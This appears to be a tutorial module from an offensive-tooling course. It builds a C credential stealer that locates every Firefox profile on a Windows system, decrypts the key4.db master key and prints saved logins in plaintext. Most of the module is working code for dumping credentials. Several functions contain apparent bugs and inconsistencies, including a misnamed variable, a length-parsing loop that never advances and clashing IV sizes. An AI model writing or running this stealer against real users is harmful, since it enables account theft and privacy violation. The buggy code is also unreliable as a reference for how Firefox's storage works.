Dumping Saved Logins: Firefox

Introduction

In the previous module, we dumped the cookies and bookmarks from all the Firefox profiles present on the system. There is another source of credentials that, just like cookies, is present in every major browser: saved logins. Firefox has a password manager feature that lets you save the usernames and passwords you use to log into websites. This feature can automatically fill in your details the next time you visit a website and lets you manage your stored logins.

In this module, we will explore how Firefox encrypts and stores saved logins and how they can be dumped. The cookie dumping tool we have created in the last module will be extended to dump saved logins and display the plaintext credentials.

You should review the previous module prior to completing this module.

This module uses Firefox 143.0 Release (September 16, 2025).

Implementation Overview

To formulate a plan for dumping saved logins, we must first understand the process that credentials go through when saved using Firefox's password manager. Note that a saved login does not necessarily need to contain both a username and a password because Firefox also allows you to save one or the other.

First, the saved credential gets AES-256-CBC encrypted using a master key and a randomly generated IV. The master key is an AES-256 key that is used to encrypt all saved login data. It is stored in an encrypted state in a SQLite database. A user can also set a master password, prompting Firefox to ask for it when accessing the password manager. In this case, the master key cannot be decrypted without knowing the master password.

After this step, Firefox creates a structure describing the encrypted username or password and serializes it according to the ASN.1 DER rules.

ASN.1 Explained

ASN.1 is a language that enables the definition of data structures that can be serialized and deserialized in a cross-platform manner. This means that a data structure can be defined only once in an abstract syntax, without being bound to any specific programming language. An ASN.1 compiler can then be used to generate code for whichever language is needed (e.g. C, C++, Java, Rust). The generated code includes the data structures themselves as well as functions to serialize and deserialize them.

Consider the following ASN.1 structure:

SEQUENCE {
  number1 INTEGER,
  number2 INTEGER
}

A C++ ASN.1 compiler would generate a structure along the lines of:

struct MyStruct
{
	size_t Integer1;
	size_t Integer2;
}

While Rust ASN.1 compiler would generate a structure similar to:

struct MyStruct 
{
    integer1: i64,
    integer2: i64,
}

Both compilers would also generate functions for serialization and deserialization. These are performed according to rules such as Basic Encoding Rules (BER) and Distinguished Encoding Rules (DER). As previously mentioned, the relevant rule set for us is DER, as these are the rules that Firefox uses to serialize the encrypted username and password descriptor. Firefox describes the encrypted login data using this ASN.1 structure:

  SEQUENCE {
    OCTETSTRING b'f8000000000000000000000000000001'
    SEQUENCE {
      OBJECTIDENTIFIER 1.2.840.113549.3.7 des-ede3-cbc
      OCTETSTRING iv 8 bytes
    }
    OCTETSTRING encryptedData
  }

Where an OCTETSTRING is a byte array, and OBJECTIDENTIFIER is a special ASN.1 data type used to uniquely identify objects.

ASN.1 DER Serialization

According to DER serialization rules, each element starts with a tag byte that identifies the ASN.1 type (e.g. SEQUENCE is identified by the 0x30 tag). This is followed by a length byte(s) indicating the number of bytes in the content, followed by the value itself. For example, OCTETSTRING b'f8000000000000000000000000000001' serialized using ASN.1 DER looks like this:

While for this example the length consists of a single byte, there is a mechanism for representing longer lengths using multiple bytes. If the first byte of the length has bit 8 as 1 (the value is >= 0x80), the lower 7 bits indicate how many subsequent bytes represent the length. For example, if the first byte is 0x82, the lower 7 bits (0x02) mean that the next two bytes represent the length itself. So if the following two bytes are 0x01 0xF4, the total length is 0x1F4 bytes.

The ParseAsn1Type Function

We will write a helper that parses structures serialized using ASN.1 DER, enabling us to extract the encrypted username or password at a later stage. The ParseAsn1Type function is used to parse a single ASN.1 type, such as an OCTETSTRING. It takes four parameters:

  • Buffer - A pointer to a buffer containing DER serialized data.

  • Type - The tag we expect this type to have. If we are parsing an OCTETSTRING, we expect it to be 0x04.

  • SkipTheData - Specifies whether the pointer should be advanced past this value. This makes it easier for us to parse structures, as these contain multiple types, not all of which are relevant to us.

  • DataSize - An optional parameter that will receive the length of the value.

First, it verifies that the tag is correct for the expected data type. Next, it advances the pointer past the tag and calls ParseLength to obtain the length of the value. This function will be explained shortly. If SkipTheData is true, the function moves the pointer past the value. Otherwise, *Buffer will point to the value itself. Finally, if the parameter has been specified, it will set DataSize to the size of the value.

The ParseLength function parses the length of a type and advances the pointer forward by the size of the length, thereby making it point to the value. It can handle lengths consisting of either a single byte or multiple bytes.

ULONG ParseLength(_In_ PUCHAR* Buffer)
{
    PUCHAR Current = *Buffer;
    ULONG  Length = 0;

    //
    // If the first byte has bit 8 as 0 (the value is < 0x80), the length of the type is the byte itself.
    //

    if ((Current[0] & 0x80) == 0)
    {
        Length = Current[0];
        Current++;
    }
    else
    {
        //
        // If the first byte has bit 8 as 1 (the value is >= 0x80), the lower 7 bits indicate how many subsequent bytes represent the length
        //

        ULONG NumberOfBytes = *Current & 0x7F;
        Current++;                             // Move to the actual length

        for (UCHAR Index = 0; Index < NumberOfBytes; Index++)
        {
            Length = (Length << 8) | *Current;
        }

        Current += NumberOfBytes;
    }

    *Buffer = Current; // Advance the pointer forward past the length
    return Length;
}

BOOLEAN ParseAsn1Type(_In_ PUCHAR* Buffer, _In_ UCHAR Type, _In_ BOOLEAN SkipTheData, _Out_opt_ PULONG DataSize)
{
    //
    // Make sure the tag matches this type
    //

    UCHAR Tag = **Buffer;

    if (Tag != Type)
    {
        return FALSE;
    }

    (*Buffer)++;

    //
    // Parse the length of the type and move the pointer forward by the size of the value
    //

    ULONG Length = ParseLength(Buffer);

    if (Length == 0)
    {
        return FALSE;
    }

    //
    // Move the pointer past the value if we don't need it
    //

    if (SkipTheData == TRUE)
    {
        *Buffer += Length;
    }

    //
    // Return the size of the value if it is needed
    //

    if (DataSize != 0)
    {
        *DataSize = Length;
    }

    return TRUE;
}

The ExtractAsn1LoginData Function

Next, we will use the ParseAsn1Type function to construct another function, ExtractAsn1LoginData, that parses the IV and encrypted data from the encrypted login structure. ExtractAsn1LoginData takes 4 parameters:

  • Buffer - A pointer to a serialized encrypted login structure.

  • Ciphertext - A pointer to a variable that will receive the encrypted data.

  • CiphertextSize - A pointer to variable that will receive the size of the encrypted data.

  • Iv - A pointer to a variable that will receive the IV.

The function parses each element of the structure one by one, extracting only the iv and encryptedData OCTETSTRING values.

/*
  SEQUENCE {
    OCTETSTRING b'f8000000000000000000000000000001'
    SEQUENCE {
      OBJECTIDENTIFIER 1.2.840.113549.3.7 des-ede3-cbc
      OCTETSTRING iv 8 bytes
    }
    OCTETSTRING encryptedData
  }
*/

VOID ExtractAsn1LoginData(_In_ PUCHAR Buffer, _Out_ PUCHAR* Ciphertext, _Out_ PULONG CiphertextSize, _Out_ PUCHAR* Iv)
{
    //
    // Start parsing the SEQUENCE containing the login data.
    // Setting SkipTheData to TRUE would have resulted in us
    // skipping the entire structure
    // 

    ULONG   Size;
    BOOLEAN Result;

    Result = ParseAsn1Type(&Buffer, SEQUENCE_TAG, FALSE, 0);

    if (Result == FALSE)
    {
        return;
    }

    //
    // Skip over the "f8000000000000000000000000000001" header, which is an OCTETSTRING
    //

    Result = ParseAsn1Type(&Buffer, OCTET_STRING_TAG, TRUE, 0);

    if (Result == FALSE)
    {
        return;
    }
    
    //
    // Get the inner SEQUENCE
    //

    Result = ParseAsn1Type(&Buffer, SEQUENCE_TAG, FALSE, 0);

    if (Result == FALSE)
    {
        return;
    }

    //
    // Move past the object identifier
    //

    Result = ParseAsn1Type(&Buffer, OBJECT_IDENTIFIER_TAG, TRUE, 0);

    if (Result == FALSE)
    {
        return;
    }

    //
    // Get the IV
    //

    Result = ParseAsn1Type(&Buffer, OCTET_STRING_TAG, FALSE, &Size);

    if (Result == FALSE
        ||
        Size != 8) // The IV is 16 bytes
    {
        return;
    }

    *Iv     = Buffer;
    Buffer += Size;

    //
    // Get the encrypted data (whether it be the username or password)
    //

    Result = ParseAsn1Type(&Buffer, OCTET_STRING_TAG, FALSE, CiphertextSize);

    if (Result == FALSE)
    {
        return;
    }

    *Ciphertext = Buffer;
}

Extracting The Master Key

The master key is stored by Firefox in an encrypted state in the key4.db SQLite database. This is serialized using ASN.1 DER as follows:

SEQUENCE {
  SEQUENCE {
    OBJECTIDENTIFIER 1.2.840.113549.1.5.13 pkcs5 pbes2
    SEQUENCE {
      SEQUENCE {
        OBJECTIDENTIFIER 1.2.840.113549.1.5.12 pkcs5 PBKDF2
        SEQUENCE {
          OCTETSTRING <PBKDF2 entry salt>
          INTEGER <PBKDF2 iteration count>
          INTEGER 20
          SEQUENCE {
            OBJECTIDENTIFIER 1.2.840.113549.2.9 hmacWithSHA256
          }
        }
      }
      SEQUENCE {
        OBJECTIDENTIFIER 2.16.840.1.101.3.4.1.42 aes256-CBC
        OCTETSTRING <AES IV>
      }
    }
  }
  OCTETSTRING <Encrypted master key>
}

The master key is encrypted using AES-256-CBC, where the AES IV is taken from the ASN.1 structure above. The AES key is derived using PBKDF2 with HMAC-SHA256, where the input password to PBKDF2 is the concatenation of the user's master password (empty string if none set) and the global salt (stored in the metadata table of the key4.db database). The entry salt and iteration count parameters for PBKDF2 are extracted from the ASN.1 structure under the PBKDF2 entry salt and PBKDF2 iteration count respectively.

Note that the structure only contains 14 bytes of the AES IV, since the first two bytes are always 0x04 and 0x0E.

Cryptographic Helper: Sha1Hash

We will construct the cryptographic helpers needed in this process before moving forward. Starting off, Sha1Hash will be used to create the SHA1 hash of the global salt, and optionally the master key. It takes four parameters:

  • MasterPassword - If a master password is provided, it will be hashed alongside the global salt.

  • Buffer - A pointer to the global salt.

  • BufferSize - The size of the global salt, in bytes.

  • HashValue- A pointer to the buffer where the computed 20-byte SHA1 hash will be stored.

The function begins with the creation of a SHA1 hash using CryptCreateHash. Next, it uses CryptHashData to create a hash of the global salt, optionally together with the master password. Finally, the hash is extracted using CryptGetHashParam.

BOOLEAN Sha1Hash(_In_opt_ PSTR MasterPassword, _In_ PUCHAR Buffer, _In_ ULONG BufferSize, _Out_ PUCHAR HashValue)
{
	HCRYPTPROV ProviderHandle;
	HCRYPTHASH HashHandle;
	ULONG      HashSize = 20;
	BOOLEAN    Result;

	Result = CryptAcquireContextW(&ProviderHandle, NULL, NULL, PROV_RSA_FULL, 0);

	if (Result == FALSE)
	{
		return FALSE;
	}

	Result = CryptCreateHash(ProviderHandle, CALG_SHA1, 0, 0, &HashHandle);

	if (Result == TRUE)
	{
		Result = (CryptHashData(HashHandle, Buffer, BufferSize, 0) && MasterKey != 0? CryptHashData(HashHandle, (PUCHAR)MasterKey, strlen(MasterKey), 0) : TRUE);

		if (Result == TRUE)
		{
			Result = CryptGetHashParam(HashHandle, HP_HASHVAL, HashValue, &HashSize, 0);
		}

		CryptDestroyHash(HashHandle);
	}

	CryptReleaseContext(ProviderHandle, 0);
	return Result;
}

Cryptographic Helper: DeriveKeyPbkdf2

Next in the queue is the DeriveKeyPbkdf2 function, which uses the BCryptDeriveKeyPBKDF2 BCrypt API to derive a key using PBKDF2. The function takes in 6 parameters:

  • Password- A pointer to the password using in the key derivation algorithm. In our case, this is the hash created using Sha1Hash.

  • PasswordSize - The size of the Password buffer.

  • Salt - A pointer to the entry salt, extracted from the ASN.1 DER structure.

  • SaltSize - The size of the Salt buffer.

  • IterationCount - The number of iterations of the algorithm.

  • DerivedKey - A pointer to a buffer which will received the derived 32-byte key.

BOOLEAN DeriveKeyPbkdf2(_In_ PUCHAR Password, _In_ ULONG PasswordSize, _In_ PUCHAR Salt, _In_ ULONG SaltSize, _In_ ULONG IterationCount, _Out_ PUCHAR DerivedKey)
{
	BCRYPT_ALG_HANDLE AlgorithmHandle;
	NTSTATUS          Status; 
	
	Status = BCryptOpenAlgorithmProvider(&AlgorithmHandle, BCRYPT_SHA256_ALGORITHM, 0, BCRYPT_ALG_HANDLE_HMAC_FLAG);

	if (!BCRYPT_SUCCESS(Status))
	{
		wprintf(L"Cannot acquire handle to the SHA256 crypto provider: %lu", GetLastError());
		return FALSE;
	}

	Status = BCryptDeriveKeyPBKDF2(AlgorithmHandle, Password, PasswordSize, Salt, SaltSize, IterationCount, DerivedKey, 32, 0);

	BCryptCloseAlgorithmProvider(AlgorithmHandle, 0);
	return BCRYPT_SUCCESS(Status);
}

Cryptographic Helper: Aes256Decrypt

Lastly, there is Aes256Decrypt which decrypts a ciphertext in-place using AES-256-CBC. The function takes in 4 parameters:

  • Key - A pointer to a 16-byte key. This is the key derived using DeriveKeyPbkdf2.

  • Iv - A pointer to a 16-byte IV. The IV is extracted from the ASN.1 DER structure.

  • Ciphertext - A pointer to the ciphertext which is to be decrypted. In our case, this will be the encrypted master key.

  • CiphertextLength - The size of the Ciphertext buffer, in bytes.

BOOLEAN Aes256Decrypt(_In_ PUCHAR Key, _In_ PUCHAR Iv, _Inout_ PUCHAR Ciphertext, _Inout_ ULONG CiphertextLength)
{
	HCRYPTPROV Provider;
	BOOL       Result = CryptAcquireContextA(&Provider, 0, 0, PROV_RSA_AES, CRYPT_VERIFYCONTEXT);

	if (Result == FALSE)
	{
		wprintf(L"Cannot acquire handle to the AES crypto provider: %lu", GetLastError());
		return FALSE;
	}

	HCRYPTKEY KeyHandle = 0;

	do
	{
		//
		// The key blob header is followed in memory by the size of the key, in bytes, and the key itself
		//

		UCHAR       Buffer[AES_KEY_BLOB_SIZE];
		BLOBHEADER* KeyBlob = (BLOBHEADER*)(Buffer);

		KeyBlob->bType = PLAINTEXTKEYBLOB;
		KeyBlob->bVersion = CUR_BLOB_VERSION;
		KeyBlob->reserved = 0;
		KeyBlob->aiKeyAlg = CALG_AES_256;

		*(PULONG)(Buffer + sizeof(BLOBHEADER)) = AES_KEY_SIZE;
		RtlCopyMemory(Buffer + sizeof(BLOBHEADER) + sizeof(ULONG), Key, AES_KEY_SIZE);

		Result = CryptImportKey(Provider, Buffer, AES_KEY_BLOB_SIZE, 0, 0, &KeyHandle);

		if (Result == FALSE)
		{
			wprintf(L"Could not import the AES key: %lu", GetLastError());
			break;
		}

		//
		// Set CBC mode
		//

		ULONG Mode = CRYPT_MODE_CBC;
		Result = CryptSetKeyParam(KeyHandle, KP_MODE, (PUCHAR)(&Mode), 0);

		if (Result == FALSE)
		{
			wprintf(L"Could not set the AES mode to CBC: %lu", GetLastError());
			break;
		}

		//
		// Set the IV
		//

		Result = CryptSetKeyParam(KeyHandle, KP_IV, Iv, 0);

		if (Result == FALSE)
		{
			wprintf(L"Could not set the IV: %lu", GetLastError());
			break;
		}

		//
		// Decrypt the ciphertext
		//

		Result = CryptDecrypt(KeyHandle, 0, TRUE, 0, Ciphertext, &CiphertextLength);

		if (Result == FALSE)
		{
			wprintf(L"Could not AES-256 decrypt the ciphertext: %lu\n", GetLastError());
		}

	} while (FALSE);

	if (KeyHandle != 0)
	{
		CryptDestroyKey(KeyHandle);
	}

	CryptReleaseContext(Provider, 0);
	return Result;
}

Decrypting The Master Key

We can now extract the master key from key4.db and decrypt it. This entire process is encapsulated by the GetMasterKey function, which takes two parameters:

  • MasterPassword - An optional parameter specifying the master password.

  • MasterKey - A pointer to a buffer that will receive the master key.

First, it opens a handle to the key4.db database and then executes the SQL query SELECT item1 FROM metadata WHERE id = "password" to retrieve the global salt. As the SQLite API executes a callback once the query has finished, we pass a context structure (LOGIN_KEY_CONTEXT) to each callback so that they can access the relevant data.

Next, we execute the "SELECT a11 FROM nssPrivate" SQL query which will retrieve the ASN.1 DER structure detailing the encrypted master key. This structure is then passed to the DecryptMasterKey function (explained later), which is responsible for extracting the key and decrypting it.

typedef struct _LOGIN_KEY_CONTEXT
{
    BOOLEAN Result;
    PUCHAR  MasterKey;
    PSTR    MasterPassword;
    UCHAR   GlobalSalt[24];
    ULONG   GlobalSaltSize;
} LOGIN_KEY_CONTEXT, * PLOGIN_KEY_CONTEXT;

CONST CHAR PasswordMetadataSqlQuery[] = "SELECT item1 FROM metadata WHERE id = 'password';";
CONST CHAR ExtractKeySqlQuery[]       = "SELECT a11 FROM nssPrivate;";

INT ExtractGlobalSaltCallback(PVOID Parameter, INT Argc, PCHAR* Argv, PCHAR* ColumnName)
{
    //
    // Extract the global salt
    //

    PLOGIN_KEY_CONTEXT KeyContext = (PLOGIN_KEY_CONTEXT)Parameter;

    KeyContext->GlobalSaltSize = strlen(Argv[0]);
    RtlCopyMemory(KeyContext->GlobalSalt, Argv[0], KeyContext->GlobalSaltSize);
    return 0;
}

INT ExtractKeyCallback(PVOID Parameter, INT Argc, PCHAR* Argv, PCHAR* ColumnName)
{
    PLOGIN_KEY_CONTEXT KeyContext             = (PLOGIN_KEY_CONTEXT)Parameter;
    PUCHAR             EncryptedMasterKey     = (PUCHAR)Argv[0];
    ULONG              EncryptedMasterKeySize = strlen(Argv[0]);

    //
    // Decrypt the master key
    //

    KeyContext->Result = DecryptMasterKey(KeyContext->MasterPassword, EncryptedMasterKey, &EncryptedMasterKeySize, KeyContext->GlobalSalt, KeyContext->GlobalSaltSize, KeyContext->MasterKey);
    return 0;
}

BOOLEAN GetMasterKey(_In_opt_ PSTR MasterPassword, _Out_ PUCHAR MasterKey)
{
    //
    // Open the key4.db database file
    //

    LOGIN_KEY_CONTEXT KeyContext = { .MasterKey = MasterKey, .MasterPassword = MasterPassword };
    PCHAR             ErrorMessage;
    sqlite3*          KeyDatabase;
    ULONG             Result;

    Result = sqlite3_open_v2("key4.db", &KeyDatabase, SQLITE_OPEN_READONLY, 0);

    if (Result != SQLITE_OK)
    {
        wprintf(L"Error opening the key4 database: %hS\n", sqlite3_errmsg(KeyDatabase));
        return FALSE;
    }

    do
    {
        //
        // Extract the global salt
        //

        Result = sqlite3_exec(KeyDatabase, PasswordMetadataSqlQuery, ExtractGlobalSaltCallback, &KeyContext, &ErrorMessage);

        if (Result != SQLITE_OK)
        {
            wprintf(L"Failed extracting the global salt from key4.db: %hS\n", ErrorMessage);
            sqlite3_free(ErrorMessage);
            break;
        }

        //
        // Use the master password to decrypt the master key
        //

        Result = sqlite3_exec(KeyDatabase, ExtractKeySqlQuery, ExtractKeyCallback, &KeyContext, &ErrorMessage);

        if (Result != SQLITE_OK)
        {
            wprintf(L"Failed querying the encrypted master key from key4.db: %hS\n", ErrorMessage);
            sqlite3_free(ErrorMessage);
            KeyContext.Result = FALSE;
        }

    } while (FALSE);

    sqlite3_close_v2(KeyDatabase);
    return KeyContext.Result;
}

The DecryptMasterKey Function

The DecryptMasterKey function is responsible for parsing the ASN.1 DER structure containing the encrypted master key, obtaining the information needed to decrypt it and doing so using the cryptographic helpers we previously created. It will go through all the types in the structure, extracting the relevant data along the way.

Next, it will use Sha1Hash to create the SHA1 of the global salt, optionally together with the master password. It will use this hash alongside the entry salt to derive an AES key using the PKBDF2 algorithm. Lastly, it will decrypt the master key using the derived AES key and IV extracted from the ASN.1 DER structure.

BOOLEAN DecryptMasterKey(_In_opt_ PSTR MasterPassword, _In_ PUCHAR Buffer, _In_ PULONG BufferSize, _In_ PUCHAR GlobalSalt, _In_ ULONG GlobalSaltSize, _Inout_ PUCHAR MasterKey)
{
    BOOLEAN Result;
    UCHAR   AesIv[16];
    PUCHAR  EntrySalt;
    ULONG   EntrySaltSize;
    ULONG   IterationCount;
    ULONG   MasterKeySize;

    //
    // Skip everything until the entry salt
    //

    for (UCHAR Count = 0; Count < 2; Count++)
    {
        Result = ParseAsn1Type(&Buffer, SEQUENCE_TAG, FALSE, 0);

        if (Result == FALSE)
        {
            return Result;
        }

        Result = ParseAsn1Type(&Buffer, SEQUENCE_TAG, FALSE, 0);

        if (Result == FALSE)
        {
            return Result;
        }

        Result = ParseAsn1Type(&Buffer, OBJECT_IDENTIFIER_TAG, TRUE, 0);

        if (Result == FALSE)
        {
            return Result;
        }
    }

    Result = ParseAsn1Type(&Buffer, SEQUENCE_TAG, FALSE, 0);

    if (Result == FALSE)
    {
        return Result;
    }

    //
    // Get the entry salt
    //

    Result = ParseAsn1Type(&Buffer, OCTET_STRING_TAG, FALSE, &EntrySaltSize);

    if (Result == FALSE)
    {
        return Result;
    }

    EntrySalt = Buffer;
    Buffer += EntrySaltSize;

    //
    // Get the iteration count
    //

    Result = ParseAsn1Type(&Buffer, INTEGER_TAG, FALSE, 0);

    if (Result == FALSE)
    {
        return Result;
    }

    IterationCount = *Buffer;
    Buffer += 1;

    //
    // Skip everything until the AES IV
    //

    Result = ParseAsn1Type(&Buffer, INTEGER_TAG, TRUE, 0);

    if (Result == FALSE)
    {
        return Result;
    }

    Result = ParseAsn1Type(&Buffer, SEQUENCE_TAG, TRUE, 0);

    if (Result == FALSE)
    {
        return Result;
    }

    Result = ParseAsn1Type(&Buffer, SEQUENCE_TAG, FALSE, 0);

    if (Result == FALSE)
    {
        return Result;
    }

    Result = ParseAsn1Type(&Buffer, OBJECT_IDENTIFIER_TAG, TRUE, 0);

    if (Result == FALSE)
    {
        return Result;
    }

    //
    // Get the last 14 bytes of the AES IV 
    //

    Result = ParseAsn1Type(&Buffer, OCTET_STRING_TAG, FALSE, 0);

    if (Result == FALSE)
    {
        return Result;
    }

    AesIv[0] = 0x04;
    AesIv[1] = 0x0E;
    RtlCopyMemory(AesIv + 2, Buffer, 14);

    Buffer += 14;

    //
    // Get the encrypted data
    //

    Result = ParseAsn1Type(&Buffer, OCTET_STRING_TAG, FALSE, &MasterKeySize);

    if (Result == FALSE)
    {
        return Result;
    }

    //
    // Decrypt the data
    //

    UCHAR Hash[20];
    UCHAR DerivedKey[32];

    Result = Sha1Hash(MasterPassword, GlobalSalt, GlobalSaltSize, Hash);

    if (Result == FALSE)
    {
        return Result;
    }

    Result = DeriveKeyPbkdf2(Hash, sizeof(Hash), EntrySalt, EntrySaltSize, IterationCount, DerivedKey);

    if (Result == FALSE)
    {
        return Result;
    }

    Result = Aes256Decrypt(DerivedKey, AesIv, Buffer, MasterKeySize);

    if (Result == TRUE)
    {
        RtlCopyMemory(MasterKey, Buffer, MasterKeySize);
    }

    return Result;
}

Dumping Saved Logins

At this point, we have everything we need to dump the saved logins. To dump the saved logins we will follow the steps below:

  • First, we will use GetMasterKey to get the master key. If the user has set a master password which we do not know, the function will fail.

  • Next, we will read the login.json file of the current profile.

  • We will iterate over each occurrence of the hostname string, signifying the URL where a piece of login information has been used.

  • For each hostname found, we will look for the encryptedUsername and encryptedPassword attributes. Since these values are enclosed in quotation marks, we can determine the size of the encrypted username and password by looking for the closing quotation mark.

  • We will decrypt the username and password before printing them to the console. Decryption is done using the DecryptLoginData function, which we will explain shortly.

The DumpMozillaLogins Function

The aforementioned steps are implemented in the DumpMozillaLogins function. This function also enables you to specify a master password if the user has one set and you were able to figure it out.

VOID DumpMozillaLogins(_In_opt_ PSTR MasterPassword)
{
    ULONG Size;
    PSTR  LoginsJson;
    PSTR  Hostname;
    ULONG HostnameSize;
    PSTR  Username;
    ULONG UsernameSize;
    PSTR  Password;
    ULONG PasswordSize;
    UCHAR MasterKey[24];

    //
    // Get the master key. It's used to AES-256-CBC encrypt the saved username and password
    //

    if (GetMasterKey(MasterPassword, MasterKey) == FALSE)
    {
        return;
    }

    //
    // Read the logins.json file. On older versions of Firefox, the saved logins are stored in a SQLite database named "signons.sqlite"
    //

    LoginsJson = (PSTR)ReadFileContents((PWCHAR)L"logins.json", &Size);

    if (LoginsJson == 0)
    {
        return;
    }

    PrintSavedLoginsBanner();

    for (PSTR Logins = strstr(LoginsJson, "hostname"); Logins != 0; Logins = strstr(Logins + 1, "hostname"))
    {
        //
        // Print the URL where this login was used 
        //

        Hostname     = Logins + sizeof("hostname: ");
        HostnameSize = strchr(Hostname, '"') - Hostname;

        wprintf(L" - Hostname: %.*hS\n", HostnameSize, Hostname);

        //
        // Get the username
        //

        Username = strstr(Hostname + HostnameSize, "encryptedUsername") + sizeof("encryptedUsername: ");

        if (Username == 0)
        {
            wprintf(L"Could not find the encryptedUsername attribute\n");
            continue;
        }

        UsernameSize = strchr(Username, '"') - Username;

        //
        // Get the password
        //

        Password = strstr(Username + UsernameSize, "encryptedPassword") + sizeof("encryptedPassword: ");

        if (Password == 0)
        {
            wprintf(L"Could not find the encryptedPassword attribute\n");
            continue;
        }

        PasswordSize = strchr(Password, '"') - Password;

        //
        // Decrypt the username and password and print them to the screen
        //

        Username = DecryptLoginData(Username, &UsernameSize, MasterKey);

        if (Username != 0)
        {
            wprintf(L" - Username: %.*hS\n", UsernameSize, Username);
        }

        Password = DecryptLoginData(Password, &PasswordSize, MasterKey);

        if (Password != 0)
        {
            wprintf(L" - Password %.*hS\n", PasswordSize, Password);
        }

        wprintf(L"\n");
    }

    HeapFree(GetProcessHeap(), 0, LoginsJson);
}

The Base64Decode Helper Function

Since this data is first encoded using Base64, let us take a look at the Base64Decode helper that we will use to decode it before going forward. This function takes three parameters:

  • EncodedBuffer - A pointer to a Base64 encoded buffer.

  • EncodedBufferSize - The size of the EncodedBuffer buffer, in bytes.

  • DecodedBufferSize - On success, this variable will receive the size of the decoded buffer.

First, it calls CryptStringToBinaryA with an empty buffer, which causes the API to return the required buffer size in the DecodedBufferSize variable. A buffer large enough to fit the decoded data is then allocated, and the data is decoded via another call to CryptStringToBinaryA. If successful, it returns a pointer to the buffer containing the decoded data.

PUCHAR Base64Decode(_In_ PSTR EncodedBuffer, _In_ ULONG EncodedBufferSize, _Inout_ PULONG DecodedBufferSize)
{
	PUCHAR  DecodedBuffer;
	BOOLEAN Result;

	//
	// Determine the size of the decoded data
	//

	Result = CryptStringToBinaryA(EncodedBuffer, EncodedBufferSize, CRYPT_STRING_BASE64, 0, DecodedBufferSize, 0, 0);

	if (Result == FALSE)
	{
		wprintf(L"Could not calculate the size of the base64 decoded data: 0x%08lX\n", GetLastError());
		return 0;
	}

	//
	// Allocate a buffer large enough to accommodate it
	//

	DecodedBuffer = (PUCHAR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, *DecodedBufferSize);

	if (DecodedBuffer == 0)
	{
		return 0;
	}

	Result = CryptStringToBinaryA(EncodedBuffer, EncodedBufferSize, CRYPT_STRING_BASE64, DecodedBuffer, DecodedBufferSize, 0, 0);

	if (Result == FALSE)
	{
		wprintf(L"Could not base64 decode the data 0x%08lX\n", GetLastError());
		HeapFree(GetProcessHeap(), 0, DecodedBuffer);
		return 0;
	}

	return DecodedBuffer;
}

The DecryptLoginData Function

The DecryptLoginData function is used to decrypt login data saved in logins.json. The function takes two parameters:

  • Data - A pointer to the data to be decrypted. Either encryptedUsername or encryptedPassword.

  • DataSize - The size of the Data buffer, in bytes.

Starting off, it uses the Base64Decode helper to base64 decode the data. Following that, it uses ExtractAsn1LoginData to extract the encrypted data and IV from the ASN.1 DER structure. Finally, it calls Aes256Decrypt which decrypts the data using AES-256-CBC.

PSTR DecryptLoginData(_In_ PSTR Data, _In_ ULONG DataSize, _In_ PUCHAR MasterKey)
{
    //
    // Base64 decode the data
    //

    ULONG  CiphertextSize;
    PUCHAR Base64Decoded;
    PUCHAR Ciphertext = 0;
    PUCHAR Iv;

    Base64Decoded = Base64Decode(Data, DataSize);

    if (Base64Decoded == 0)
    {
        return 0;
    }

    //
    // Extract the IV and encrypted data from the ASN1.DER encoded buffer
    //

    ExtractAsn1LoginData(Base64Decoded, &Ciphertext, &CiphertextSize, &Iv);

    if (Ciphertext != 0)
    {
        //
        // Decrypt the data using AES-256-CBC
        //

        Aes256Decrypt(MasterKey, Iv, Ciphertext, DataSize);
    }

    //
    // Free the data
    //

    HeapFree(GetProcessHeap(), 0, Base64Decoded);
    return (PSTR)Ciphertext;
}

Putting It All Together

The main function in the previous module was used to dump cookies and bookmarks. We will now update it by inserting a call to DumpMozillaLogins in the loop that iterates over each profile described in the profiles.ini file. This enables us to dump the saved logins of all profiles on the system with only minor alterations to the original code.

Recall that the profiles.ini file contains the location of each user's profile directory, which stores personal data such as browsing history, bookmarks, cookies, and saved logins.

INT main(_In_ INT Argc, _In_ PSTR* Argv)
{
    //
    // Get the AppData folder path
    //

    PWSTR   AppDataPath;
    HRESULT Result;
    PCHAR   ProfilePath;
    PCHAR   Buffer;
    ULONG   BufferSize;
    WCHAR   Path[MAX_PATH * 2];
    ULONG   PathSize;
    PSTR    MasterPassword = Argc == 2 ? Argv[1] : 0; // NEW!!!

    Result = SHGetKnownFolderPath(FOLDERID_RoamingAppData, KF_FLAG_DONT_UNEXPAND, 0, &AppDataPath);

    if (FAILED(Result))
    {
        wprintf(L"Could not get the path of the AppData folder: %lu\n", Result);
        return Result;
    }

    //
    // Create the path to the file detailing the Firefox profiles and free the memory allocated by SHGetKnownFolderPath
    //

    wcscpy(Path, AppDataPath);
    wcscat(Path, L"\\Mozilla\\Firefox\\profiles.ini");
    PathSize = wcslen(Path) - sizeof(L"profiles.ini") / sizeof(WCHAR) + 1; // Size of the %APPDATA%\Mozilla\Firefox\ path
    CoTaskMemFree(AppDataPath);

    //
    // Read the profiles.ini file
    //

    Buffer = (PCHAR)ReadFileContents(Path, &BufferSize);

    if (Buffer == 0)
    {
        return -1;
    }

    //
    // Set the last occurance of '\' character to NULL to remove the "profiles.ini" part from the path
    //

    *(Path + PathSize) = UNICODE_NULL;

    //
    // Iterate over each profile and get the path to its directory
    //

    for(ProfilePath = strstr(Buffer, "Path="); ProfilePath != 0; ProfilePath = strstr(ProfilePath + 1, "Path="))
    {
        //
        // Set the current working directory as this profile's path so we can use relative paths
        //

        if (SetProfilePathAsWorkingDirectory(ProfilePath, Path, PathSize, *(ProfilePath - 3) - '0') == FALSE)
        {
            continue;
        }

        //
        // Dump this profile's cookies, bookmarks and saved logins
        //

        DumpMozillaCookies();
        DumpMozillaBookmarks();
        DumpMozillaLogins(MasterPassword); // NEW!!!

        //
        // Move on to the next profile
        //
    }

    HeapFree(GetProcessHeap(), 0, Buffer);
    return 0;
}
